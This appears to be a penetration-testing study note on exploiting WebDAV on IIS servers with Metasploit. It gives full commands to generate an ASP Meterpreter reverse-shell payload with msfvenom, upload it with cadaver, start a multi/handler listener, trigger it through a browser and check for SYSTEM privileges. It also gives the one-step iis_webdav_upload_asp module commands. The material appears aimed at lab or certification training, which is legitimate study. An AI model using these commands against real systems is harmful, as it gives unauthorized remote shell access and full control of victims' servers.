# Exploiting WebDAV with MetaSploit

## Contents
- [Payload Prep](#payload-prep)
  - [1. MSFVenom](#1-msfvenom)
  - [2. Upload the Payload](#2-upload-the-payload)
  - [3. Set up a Listener](#3-set-up-a-listener)
  - [4. Browser to Execute](#4-browser-to-execute)
  - [5. Reverse Shell](#5-reverse-shell)
- [Automated Exploit](#automated-exploit)

## Payload Prep

### 1. MSFVenom
> msfvenom is a Metasploit tool that allows you to generate payloads (e.g., reverse shells, remote access, etc.)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[local host ip] LPORT=[local port number] -f asp > shell.asp
```
- `-p` for payload
- `-f` for file format
- This prepares a reverse shell meterpreter session

### 2. Upload the Payload
- Use [cadaver](exploit_webdav.md#5-cadaver) to upload the payload (shell.asp)

### 3. Set up a Listener
- Set up a listener on the port you designated in the msfvenom command above.
- Start up `msfconsole`:
  - Load the multi/handler module: `use multi/handler`
  - Set your payload (it has to be the same payload you specified in the msfvenom build): `set payload windows/meterpreter/reverse_tcp`
  - Set LHOST and LPORT (same as msvenom)
  - Check your options.
  - `run` will start up the listener (the reverse TCP handler)

### 4. Browser to Execute
- Go back to your browser, the webdav directory, and execute the payload.

### 5. Reverse Shell
- Back to Metasploit and you should have a reverse shell into the target
- Run `sysinfo` to get info on the target machine
- Run `getuid` to check out who you are on the target machine. (NT AUTHORITY/SYSTEM indicates we are admin/root)

## Automated Exploit
> You can do all of the above using one MetaSploit module.
```
use exploit/windows/iis/iis_webdav_upload_asp
set payload windows/meterpreter/reverse_tcp
set LHOST [IP]
set RHOST [IP]
set PATH /[SUBDIR]
    # example: /webdav/
run
```
